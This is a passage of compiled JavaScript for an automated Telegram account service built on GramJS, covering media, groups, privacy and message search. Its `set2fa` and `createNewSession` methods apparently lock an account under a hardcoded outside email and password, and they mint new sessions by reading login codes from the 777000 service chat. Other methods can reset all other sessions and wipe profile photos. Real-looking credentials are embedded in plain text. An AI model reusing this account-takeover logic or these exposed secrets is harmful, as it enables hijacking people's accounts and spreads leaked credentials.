                res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
                const chunkSize = 512 * 1024;
                for await (const chunk of this.client.iterDownload({
                    file: fileLocation,
                    offset: big_integer_1.default[0],
                    limit: 5 * 1024 * 1024,
                    requestSize: chunkSize,
                })) {
                    res.write(chunk);
                }
                res.end();
            }
            else {
                res.status(404).send('Media not found');
            }
        }
        catch (error) {
            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {
                return res.status(404).send('File reference expired');
            }
            console.error('Error downloading media:', error);
            res.status(500).send('Error downloading media');
        }
    }
    async downloadWithTimeout(promise, timeout) {
        return Promise.race([
            promise,
            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
        ]);
    }
    getMediaDetails(media) {
        if (!media?.document)
            return null;
        const doc = media.document;
        if (doc instanceof telegram_1.Api.DocumentEmpty)
            return null;
        const videoAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo);
        const fileNameAttr = doc.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
        return {
            size: doc.size,
            mimeType: doc.mimeType,
            fileName: fileNameAttr?.fileName || null,
            duration: videoAttr?.duration || null,
            width: videoAttr?.w || null,
            height: videoAttr?.h || null
        };
    }
    async downloadFileFromUrl(url) {
        try {
            const response = await axios_1.default.get(url, {
                responseType: 'arraybuffer',
                timeout: 30000
            });
            return Buffer.from(response.data);
        }
        catch (error) {
            throw new Error(`Failed to download file: ${error.message}`);
        }
    }
    async forwardMessage(toChatId, fromChatId, messageId) {
        try {
            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });
        }
        catch (error) {
            console.log("Failed to Forward Message : ", error.errorMessage);
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (increment < 10) {
                try {
                    const result = await this.client.invoke(new telegram_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        await this.client.invoke(new telegram_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        if (increment >= 6) {
                            const randomChars = Math.random().toString(36).substring(2, 6);
                            username = baseUsername + randomChars;
                        }
                        else {
                            username = baseUsername + increment;
                        }
                        increment++;
                        await (0, Helpers_1.sleep)(2000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    if (increment >= 6) {
                        const randomChars = Math.random().toString(36).substring(2, 6);
                        username = baseUsername + randomChars;
                    }
                    else {
                        username = baseUsername + increment;
                    }
                    increment++;
                    await (0, Helpers_1.sleep)(2000);
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyForwards(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("forwards Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll(),
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                key: new telegram_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new telegram_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async sendViewOnceMedia(chatId, buffer, caption = '', isVideo, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        try {
            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;
            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile(actualFilename, buffer.length, actualFilename, buffer),
                workers: 1
            });
            const result = await this.client.invoke(new telegram_1.Api.messages.SendMedia({
                peer: chatId,
                media: isVideo
                    ? new telegram_1.Api.InputMediaUploadedDocument({
                        file: inputFile,
                        mimeType,
                        attributes: [
                            new telegram_1.Api.DocumentAttributeVideo({
                                supportsStreaming: true,
                                duration: 0,
                                w: 0,
                                h: 0
                            })
                        ],
                        ttlSeconds: 10
                    })
                    : new telegram_1.Api.InputMediaUploadedPhoto({
                        file: inputFile,
                        ttlSeconds: 10
                    }),
                message: caption,
                randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
            }));
            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);
            return result;
        }
        catch (error) {
            console.error('Error sending view-once media:', error);
            throw error;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', () => resolve(true));
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new telegram_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new telegram_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            console.log("Password Does not exist, Setting 2FA");
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                await imapService.connectToMail();
                const checkMailInterval = setInterval(async () => {
                    console.log("Checking if mail is ready");
                    if (imapService.isMailReady()) {
                        clearInterval(checkMailInterval);
                        console.log("Mail is ready, checking code!");
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("Code sent");
                                return new Promise(async (resolve, reject) => {
                                    let retry = 0;
                                    const codeInterval = setInterval(async () => {
                                        try {
                                            console.log("Checking code");
                                            retry++;
                                            if (imapService.isMailReady() && retry < 4) {
                                                const code = await imapService.getCode();
                                                console.log('Code:', code);
                                                if (code) {
                                                    await imapService.disconnectFromMail();
                                                    clearInterval(codeInterval);
                                                    resolve(code);
                                                }
                                            }
                                            else {
                                                clearInterval(codeInterval);
                                                await imapService.disconnectFromMail();
                                                reject(new Error("Failed to retrieve code"));
                                            }
                                        }
                                        catch (error) {
                                            clearInterval(codeInterval);
                                            await imapService.disconnectFromMail();
                                            reject(error);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => {
                                console.error('Email code error:', (0, parseError_1.parseError)(e));
                                return Promise.resolve("error");
                            }
                        });
                        return twoFaDetails;
                    }
                    else {
                        console.log("Mail not ready yet");
                    }
                }, 5000);
            }
            catch (e) {
                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
            }
        }
        else {
            console.log("Password already exists");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new telegram_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new telegram_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
    async createNewSession() {
        const me = await this.client.getMe();
        console.log("Phne:", me.phone);
        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 1,
        });
        await newClient.start({
            phoneNumber: me.phone,
            password: async () => "Ajtdmwajt1@",
            phoneCode: async () => {
                console.log('Waiting for the OTP code from chat ID 777000...');
                return await this.waitForOtp();
            },
            onError: (err) => { throw err; },
        });
        const session = newClient.session.save();
        await newClient.destroy();
        console.log("New Session: ", session);
        return session;
    }
    async waitForOtp() {
        for (let i = 0; i < 3; i++) {
            try {
                console.log("Attempt : ", i);
                const messages = await this.client.getMessages('777000', { limit: 1 });
                const message = messages[0];
                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("returning: ", code);
                    return code;
                }
                else {
                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
                    const code = message.text.split('.')[0].split("code:**")[1].trim();
                    console.log("Skipped Code: ", code);
                    if (i == 2) {
                        return code;
                    }
                    await (0, Helpers_1.sleep)(5000);
                }
            }
            catch (err) {
                await (0, Helpers_1.sleep)(2000);
                console.log(err);
            }
        }
    }
    async createGroupWithOptions(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.createGroupOrChannel(options);
        let channelId;
        if ('updates' in result) {
            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];
            const channelUpdate = updates.find(u => u instanceof telegram_1.Api.UpdateChannel);
            if (channelUpdate && 'channelId' in channelUpdate) {
                channelId = channelUpdate.channelId;
            }
        }
        if (!channelId) {
            throw new Error('Failed to create channel');
        }
        const channel = await this.client.getEntity(channelId);
        if (!(channel instanceof telegram_1.Api.Channel)) {
            throw new Error('Created entity is not a channel');
        }
        if (options.members?.length) {
            const users = await Promise.all(options.members.map(member => this.client.getInputEntity(member)));
            await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
                channel: await this.client.getInputEntity(channel),
                users
            }));
        }
        if (options.photo) {
            const buffer = await this.downloadFileFromUrl(options.photo);
            const inputFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            await this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: await this.client.getInputEntity(channel),
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: inputFile
                })
            }));
        }
        return channel;
    }
    async updateGroupSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getEntity(settings.groupId);
        if (settings.title) {
            await this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: channel,
                title: settings.title || ''
            }));
        }
        ;
        if (settings.description) {
            await this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: channel,
                about: settings.description
            }));
        }
        if (settings.username) {
            await this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: channel,
                username: settings.username
            }));
        }
        if (settings.slowMode !== undefined) {
            await this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: channel,
                seconds: settings.slowMode
            }));
        }
        return true;
    }
    async scheduleMessageSend(opts) {
        if (!this.client)
            throw new Error('Client not initialized');
        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);
        if (opts.media) {
            const buffer = await this.downloadFileFromUrl(opts.media.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return this.client.sendFile(opts.chatId, {
                file: uploadedFile,
                caption: opts.message,
                forceDocument: opts.media.type === 'document',
                scheduleDate
            });
        }
        return this.client.sendMessage(opts.chatId, {
            message: opts.message,
            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)
        });
    }
    async getScheduledMessages(chatId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.messages.GetScheduledHistory({
            peer: chatId,
            hash: (0, big_integer_1.default)(0)
        }));
        return 'messages' in result && Array.isArray(result.messages)
            ? result.messages.filter(msg => msg instanceof telegram_1.Api.Message)
            : [];
    }
    async sendMediaAlbum(album) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(album.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const uploadedFile = await this.client.uploadFile({
                file: new uploads_1.CustomFile('media', buffer.length, 'media', buffer),
                workers: 1
            });
            return new telegram_1.Api.InputSingleMedia({
                media: item.type === 'photo'
                    ? new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile })
                    : new telegram_1.Api.InputMediaUploadedDocument({
                        file: uploadedFile,
                        mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',
                        attributes: []
                    }),
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: album.chatId,
            multiMedia: mediaFiles
        }));
    }
    async sendMessage(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { peer, parseMode, message } = params;
        return await this.client.sendMessage(peer, { message, parseMode });
    }
    async sendVoiceMessage(voice) {
        if (!this.client)
            throw new Error('Client not initialized');
        const buffer = await this.downloadFileFromUrl(voice.url);
        return await this.client.invoke(new telegram_1.Api.messages.SendMedia({
            peer: voice.chatId,
            media: new telegram_1.Api.InputMediaUploadedDocument({
                file: await this.client.uploadFile({
                    file: new uploads_1.CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),
                    workers: 1
                }),
                mimeType: 'audio/ogg',
                attributes: [
                    new telegram_1.Api.DocumentAttributeAudio({
                        voice: true,
                        duration: voice.duration || 0
                    })
                ]
            }),
            message: voice.caption || '',
            randomId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000000))
        }));
    }
    async cleanupChat(cleanup) {
        if (!this.client)
            throw new Error('Client not initialized');
        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;
        const messages = await this.client.getMessages(cleanup.chatId, {
            limit: 1000,
            ...(cleanup.beforeDate && {
                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)
            })
        });
        const toDelete = messages.filter(msg => {
            if (cleanup.excludePinned && msg.pinned)
                return false;
            if (cleanup.onlyMedia && !msg.media)
                return false;
            return true;
        });
        if (toDelete.length > 0) {
            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {
                revoke: cleanup.revoke
            });
        }
        return { deletedCount: toDelete.length };
    }
    async updatePrivacyBatch(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const privacyRules = {
            everybody: [new telegram_1.Api.InputPrivacyValueAllowAll()],
            contacts: [new telegram_1.Api.InputPrivacyValueAllowContacts()],
            nobody: [new telegram_1.Api.InputPrivacyValueDisallowAll()]
        };
        const updates = [];
        const privacyMap = {
            phoneNumber: telegram_1.Api.InputPrivacyKeyPhoneNumber,
            lastSeen: telegram_1.Api.InputPrivacyKeyStatusTimestamp,
            profilePhotos: telegram_1.Api.InputPrivacyKeyProfilePhoto,
            forwards: telegram_1.Api.InputPrivacyKeyForwards,
            calls: telegram_1.Api.InputPrivacyKeyPhoneCall,
            groups: telegram_1.Api.InputPrivacyKeyChatInvite
        };
        for (const [key, value] of Object.entries(settings)) {
            if (value && key in privacyMap) {
                updates.push(this.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new privacyMap[key](),
                    rules: privacyRules[value]
                })));
            }
        }
        await Promise.all(updates);
        return true;
    }
    async getSessionInfo() {
        if (!this.client)
            throw new Error('Client not initialized');
        const [authorizationsResult, devicesResult] = await Promise.all([
            this.client.invoke(new telegram_1.Api.account.GetAuthorizations()),
            this.client.invoke(new telegram_1.Api.account.GetWebAuthorizations())
        ]);
        const sessions = authorizationsResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            deviceModel: auth.deviceModel,
            platform: auth.platform,
            systemVersion: auth.systemVersion,
            appName: auth.appName,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            country: auth.country,
            region: auth.region
        }));
        const webSessions = devicesResult.authorizations.map(auth => ({
            hash: auth.hash.toString(),
            domain: auth.domain,
            browser: auth.browser,
            platform: auth.platform,
            dateCreated: new Date(auth.dateCreated * 1000),
            dateActive: new Date(auth.dateActive * 1000),
            ip: auth.ip,
            region: auth.region
        }));
        return {
            sessions,
            webSessions
        };
    }
    async terminateSession(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.exceptCurrent) {
            if (options.type === 'app') {
                await this.client.invoke(new telegram_1.Api.auth.ResetAuthorizations());
            }
            else {
                await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorizations());
            }
            return true;
        }
        if (options.type === 'app') {
            await this.client.invoke(new telegram_1.Api.account.ResetAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        else {
            await this.client.invoke(new telegram_1.Api.account.ResetWebAuthorization({
                hash: (0, big_integer_1.default)(options.hash)
            }));
        }
        return true;
    }
    async getChatStatistics(chatId, period) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = Math.floor(Date.now() / 1000);
        const periodInSeconds = {
            day: 24 * 60 * 60,
            week: 7 * 24 * 60 * 60,
            month: 30 * 24 * 60 * 60
        }[period];
        const messages = await this.client.getMessages(chatId, {
            limit: 100,
            offsetDate: now - periodInSeconds
        });
        const stats = {
            period,
            totalMessages: messages.length,
            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,
            messageTypes: {
                text: messages.filter(m => !m.media && m.message).length,
                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(messages.reduce((acc, msg) => {
                const senderId = msg.fromId?.toString();
                if (senderId) {
                    acc[senderId] = (acc[senderId] || 0) + 1;
                }
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(messages.reduce((acc, msg) => {
                const hour = new Date(msg.date * 1000).getHours();
                acc[hour] = (acc[hour] || 0) + 1;
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };
        return stats;
    }
    getMediaExtension(media) {
        if (!media)
            return 'bin';
        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc))
                    return 'bin';
                const mime = doc.mimeType;
                if (mime?.startsWith('video/'))
                    return 'mp4';
                if (mime?.startsWith('image/'))
                    return mime.split('/')[1];
                if (mime?.startsWith('audio/'))
                    return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }
    getSearchFilter(filter) {
        switch (filter) {
            case 'photo': return new telegram_1.Api.InputMessagesFilterPhotos();
            case 'video': return new telegram_1.Api.InputMessagesFilterVideo();
            case 'document': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
            case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new telegram_1.Api.InputMessagesFilterEmpty();
        }
    }
    getMediaType(media) {
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            return 'photo';
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }
    getEntityId(entity) {
        if (entity instanceof telegram_1.Api.User)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Channel)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Chat)
            return entity.id.toString();
        return '';
    }
    async addGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(members.map(member => this.client.getInputEntity(member)));
        await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }
    async removeGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new telegram_1.Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new telegram_1.Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }
    async promoteToAdmin(groupId, userId, permissions, rank) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }
    async demoteAdmin(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }
    async unblockGroupUser(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }
    async getGroupAdmins(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            const users = result.users;
            return participants.map(participant => {
                const adminRights = participant.adminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }
    async getGroupBannedUsers(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            return participants.map(participant => {
                const bannedRights = participant.bannedRights;
                return {
                    userId: participant.peer.chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }
    async searchMessages(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        };
        const { chatId, query = '', types, maxId, minId, limit } = params;
        console.log("Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };
            console.log(type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: (0, big_integer_1.default)(0),
            };
            let messages = [];
            let count = 0;
            console.log("Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                console.log("Performing search in chat: ", chatId);
                const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            else {
                console.log("Performing global search");
                const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                    ...searchQuery,
                    offsetRate: 0,
                    offsetPeer: new telegram_1.Api.InputPeerEmpty(),
                    offsetId: 0,
                    usersOnly: true
                }));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
                console.log("Text Filter");
                messages = messages.filter((msg) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ];
                if (message.media && message.media instanceof telegram_1.Api.MessageMediaDocument) {
